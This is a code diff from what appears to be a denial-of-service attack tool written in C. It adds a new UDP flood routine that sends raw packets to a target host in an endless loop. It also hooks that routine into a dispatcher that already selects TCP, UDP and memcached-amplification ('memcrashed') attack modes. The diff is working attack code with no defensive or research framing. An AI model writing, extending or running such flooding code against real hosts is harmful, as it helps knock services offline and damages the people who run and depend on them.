@@ -148,7 +148,7 @@ void _ddos_udp(char* host, int port, char* packet)
     }
     tcount--;
 }
-void ddos_synflood(_dos_param* x){
+void _ddos_synflood(_dos_param* x){
     //TODO
 }
 
@@ -178,6 +178,27 @@ _dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
     return p;
 }
 
+void _ddos_udpv2(char* host,int port,char* __packet){
+    int sock=dos_raw_sock(IPPROTO_UDP, false);
+    udppacket* _packet=setup_udppacket("0.0.0.0", host, randrange(10000, 65532), port, __packet);
+    char* buf=udppacket_pack(_packet);
+    size_t len=strlen(buf);
+    for(;;){
+        if(use_dos_sleep){
+            sleep_ms(dos_sleep);
+        }
+        if (!__run) {
+            shutdown(sock, 2);
+            break;
+        }
+        dos_raw_send(sock, _packet, port, host, len);
+        if(status){
+            psent+=psize;
+            pc++;
+        }
+    }
+}
+
 void __ddos_wrapper(_dos_param* x)
 {
     if (x->mode == MODE_TCP) {
@@ -186,6 +207,8 @@ void __ddos_wrapper(_dos_param* x)
         _ddos_udp(x->host, x->port, x->packet);
     }else if(x->mode==MODE_MEMCRASHED){
         memcrashed_ddos(x);
+    }else if (x->mode==MODE_UDPV2){
+        _ddos_udpv2(x->host, x->port, x->packet);
     } else {
         error("Bad wrapper descriptor!");
         assert(false);
